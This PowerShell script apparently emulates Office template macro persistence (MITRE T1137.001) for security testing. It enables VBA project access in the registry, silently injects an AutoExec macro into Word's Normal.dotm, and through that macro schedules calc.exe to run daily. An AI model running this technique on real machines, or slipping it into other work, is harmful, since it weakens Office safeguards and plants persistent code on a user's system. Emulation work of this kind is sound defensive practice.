# Registry setting to "Trust access to the VBA project object model" in Word
$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
$registryValue = "AccessVBOM"
$registryData = "1"

# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0
$flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
$flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"

# Get the value of the Key/Value pair
$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue

# Logical operation to: if the value of the key/value is 1, do nothing - 
# if the value is 0, change it to 1 and create flag1 - 
# if it doesn't exist, create the value and flag2
    if ($value -eq "1") 
    {
        Write-Host "The registry value '$registryValue' already exists with the required setting."
    }   
    elseif ($value -eq "0") 
    {
        Write-Host "The registry value was set to 0, temporarily changing to 1."
        New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force
        echo "flag1" > $flagPath1
    } 
    else 
    {
        Write-Host "The registry value '$registryValue' does not exist, temporarily creating it."
        New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force
        echo "flag2" > $flagPath2
    }


Add-Type -AssemblyName Microsoft.Office.Interop.Word
# Define the path of copied normal template for restoral
$copyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm"
# Define the path to the normal template
$docPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal.dotm"
# Create copy of orginal template for restoral
Copy-Item -Path $docPath -Destination $copyPath -Force

# VBA code to be insterted as a Macro
# Will create a scheduled task to open the Calculator at 10:50am daily
$vbaCode = @"
Sub AutoExec()
    Dim applicationPath As String
    Dim taskName As String
    Dim runTime As String
    Dim schTasksCmd As String

    applicationPath = "C:\Windows\System32\calc.exe"
    taskName = "OpenCalcTask"
    runTime = "10:50"
    schTasksCmd = "schtasks /create /tn """ & taskName & """ /tr """ & applicationPath & """ /sc daily /st " & runTime & " /f"

    Shell "cmd.exe /c " & schTasksCmd, vbNormalFocus
End Sub
"@

# Create a new instance of Word.Application
$word = New-Object -ComObject Word.Application
# Keep the Word application hidden
$word.Visible = $false
# Open the document
$document = $word.Documents.Open($docPath)
# Access the VBA project of the document
$vbaProject = $document.VBProject
# Add a new module to the VBA project
$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule
# Add the VBA code to the new module
$newModule.CodeModule.AddFromString($vbaCode)
# Run the Macro
$word.run("AutoExec")
# Save and close the document
$document.SaveAs($docPath)
$document.Close()
# Quit Word
$word.Quit()

# Release COM objects
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null

